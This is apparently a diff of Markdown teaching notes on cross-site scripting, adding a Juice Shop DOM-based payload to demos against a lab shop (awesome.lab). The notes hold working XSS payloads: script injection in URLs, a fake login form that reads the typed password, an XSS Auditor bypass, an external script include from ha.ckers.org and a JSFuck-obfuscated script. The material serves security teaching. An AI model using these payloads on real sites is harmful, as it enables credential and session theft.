@@ -70,14 +70,22 @@ Sed scelerisque sed leo in rutrum. Etiam aliquet, nisl at facilisis ullamcorper,
 
 ## DOM based
 
-AwesomeShop
+### Juice Shop
+
+Try this in search:
+
+```
+<iframe src="javascript:alert(document.domain)">
+```
+
+### AwesomeShop
 
 `http://awesome.lab/oc/index.php?route=common/home#default=Slovak`
 
 `http://awesome.lab/oc/index.php?route=common/home#default=%3Cscript%3Ealert%281%29%3C/script%3E`
 
 
-## XSS demo in my Firefox (password steal)
+#### XSS demo in my Firefox (password steal)
 
 ```
 http://awesome.lab/oc/index.php?route=product/search&search=<h1>Hacked</h1>
@@ -85,7 +93,7 @@ http://awesome.lab/oc/index.php?route=product/search&search=<script>alert(1)</sc
 http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=post><input type=text name=email><input type=password name=password></form><script>setTimeout(function(){alert(x[0].value%2b/ : /.source%2bx[1].value)},100);</script>
 ```
 
-## XSS demo in my Chrome (XSS Auditor bypass)
+#### XSS demo in my Chrome (XSS Auditor bypass)
 
 ```
 http://awesome.lab/oc/index.php?route=product/search&search=<xxx class=fancybox data-fancybox-start=1 data-fancybox-type=html data-fancybox-href="%26lt;script>alert(2);%26lt;/script>">
@@ -93,7 +101,7 @@ http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=po
 ```    
 
 
-### Prezentacia
+## Slides
 
 ```
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
@@ -114,7 +122,8 @@ http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=po
 
 
 JSFuck
-```
+
+```javascript
 <script>
 [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
 </script>
